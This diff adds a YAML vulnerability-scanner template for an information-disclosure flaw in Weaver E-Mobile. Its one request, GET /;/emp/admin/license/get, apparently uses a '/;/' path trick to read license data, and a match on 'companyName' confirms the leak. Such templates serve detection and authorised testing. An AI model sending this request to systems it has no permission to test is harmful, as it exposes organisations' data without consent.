@@ -1,0 +1,31 @@
+id: weaver-emobile-get-disclosure
+info:
+  name: 泛微E-Mobile-get-信息泄露
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/CRlife/Rscan/blob/0edbf44689fbc876294a7d8603639dfe44fabeee/poc/yaml-poc/poc-yaml-E-Mobile-get-leak.yaml
+  classification:
+    cve-id: 
+  metadata:
+    verified: false
+    fofa-query: demo
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: weaver,emobile,oa,disclosure
+
+http:
+  - raw:
+      - |
+        GET /;/emp/admin/license/get HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body,'companyName')
+        condition: and
